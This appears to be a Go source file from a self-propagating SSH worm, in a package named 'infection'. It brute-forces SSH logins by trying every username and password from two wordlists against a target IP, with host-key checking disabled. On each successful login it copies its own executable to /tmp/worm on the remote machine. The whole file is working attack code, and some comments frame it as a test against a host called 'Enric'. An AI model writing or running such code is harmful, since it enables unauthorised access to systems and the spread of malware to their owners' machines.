package infection

import (
	"fmt"
	"log"
  "bufio"
  "os"
	"time"
	"bytes"
	"golang.org/x/crypto/ssh"
)
//Loop function I used to test *Enric*
func BruteForce (ip string) string {
	timeout = time.Minute
  users,err_users := os.Open("users.txt")

  if err_users != nil {
    log.Fatal(err_users)
  }

  defer users.Close()

  user_scanner := bufio.NewScanner(users)

  for user_scanner.Scan() {

		username = user_scanner.Text()

		pwds,err_pwds := os.Open("passwords.txt")

	  if err_pwds != nil {
	    log.Fatal(err_pwds)
	  }

		defer pwds.Close()

		pwd_scanner := bufio.NewScanner(pwds)

    for pwd_scanner.Scan(){
			password = pwd_scanner.Text()
			//log.Println("Trying new pair:", "username:", username, "password:", password, "on ip:", ip)
			SshInfectEnric(ip, username, password)
    }

		if err_pwds := pwd_scanner.Err(); err_pwds != nil {
	    log.Fatal(err_pwds)
	  }
  }

  if err_users := user_scanner.Err(); err_users != nil {
    log.Fatal(err_users)
  }

  return "BruteForce finished"
}

//Dummy connection I used to test *Enric*
func SshInfectEnric(ip string, username string, password string) string {
	config := &ssh.ClientConfig{
		User: username,
		Auth: []ssh.AuthMethod{
			ssh.Password(password),
		},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
		Timeout: timeout,
	}
	fmt.Println("Trying new pair:", "username:", username, "password:", password, "on ip:", ip)
	client,err := ssh.Dial("tcp",ip,config)
	if err != nil {
		fmt.Println("Failed to dial: ", err)
		return "Trying next iteration"
	}
	defer client.Close()
	session, err := client.NewSession()
	if err != nil {
		fmt.Println("Failed to create session: ", err)
		return "Trying next iteration"
	}
	defer session.Close()
	var worm []byte
	worm = GetFile("/proc/self/exe")
	session.Stdin = bytes.NewReader(worm)
	out,err := session.CombinedOutput("cat > /tmp/worm")
	log.Printf("Command output: %q", out)

	if len(out) != 0 {
		log.Printf("Command output: %q", out)
	}

	return "Finished"
}
